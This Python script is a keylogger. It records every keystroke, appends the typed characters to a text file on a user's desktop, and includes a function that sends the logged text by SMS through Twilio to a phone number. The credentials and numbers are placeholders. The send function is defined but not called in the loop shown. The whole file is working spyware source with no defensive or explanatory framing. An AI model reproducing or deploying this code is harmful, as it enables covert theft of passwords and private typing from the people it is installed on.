import keyboard
from twilio.rest import Client

accountSID = 'TWILIO SID'
authToken = 'AUTHTOKEN'

client = Client(accountSID, authToken)

q = keyboard.start_recording()
dumpPath = 'C:\\Users\\Mark\\Desktop\\LoggerDump.txt'

def SendLoggingDump(data: str):
    message = client.messages.create(from_='+PHONENUMBER', to='+PHONENUMBER' , body=data)
    return 

while True:
    with open(dumpPath, 'a') as f:
        keyEvent = q[0].get()
        if 'down' in str(keyEvent):
            if keyEvent.name == 'space':
                f.write(' ')
            if len(keyEvent.name) > 1:
                pass
            else:
                f.write(keyEvent.name)
                with open (dumpPath, 'r') as file:
                    print(file.read())